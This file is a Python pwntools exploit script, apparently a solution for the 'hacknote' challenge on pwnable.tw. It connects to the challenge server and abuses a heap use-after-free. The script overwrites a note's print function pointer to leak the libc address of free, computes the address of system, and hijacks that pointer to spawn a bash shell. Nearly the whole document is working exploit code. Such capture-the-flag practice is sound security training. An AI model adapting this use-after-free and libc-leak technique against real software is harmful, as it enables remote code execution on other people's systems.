from pwn import *
import struct

#r = process(["gdbserver", "localhost:1235", "./hacknote"])
#r = process("./hacknote")
r = remote("chall.pwnable.tw", port=10102)

def recvuntil (text):
    print(r.recvuntil(text).decode(), end="")

def sendline (text):
    print(text)
    r.sendline(text)

def create_block(size, content):
    recvuntil("choice :")
    sendline("1")
    recvuntil("size :")
    sendline(str(size))
    recvuntil("Content :")
    sendline(content)

def delete_block(index):
    recvuntil("choice :")
    sendline("2")
    recvuntil("Index :")
    sendline(str(index))

def print_block(index):
    recvuntil("choice :")
    sendline("3")
    recvuntil("Index :")
    sendline(str(index))

def read_block(index):
    recvuntil("choice :")
    sendline("3")
    recvuntil("Index :")
    sendline(str(index))
    return r.recvline()

def p (h):
    return h.to_bytes(4, "little")

puts = (0x804862B).to_bytes(4, "little")
got_addr_free = (0x0804A018).to_bytes(4, "little")
payload1 = puts + got_addr_free

create_block(1, "A" * 1)
delete_block(0)
create_block(13, "K" * 13) 
create_block(13, "B" * 13) 
delete_block(1)
delete_block(2)
create_block(12, payload1)
free_addr = struct.unpack("<I", read_block(0)[:4])[0]
#free_normal = 0x0007a970
free_normal = 0x000705b0
print(hex(free_addr))
base = free_addr - free_normal

#offset = 0x0003cd10
offset = 0x0003a940
system = (base + offset).to_bytes(4, "little")
payload2 = system + b"&bash"

delete_block(3)
create_block(12, payload2)
print_block(0)
r.interactive()


# PTR -> x/5wx 0x0804A050
# i r eax
# heap -> x/32x 0x0804b160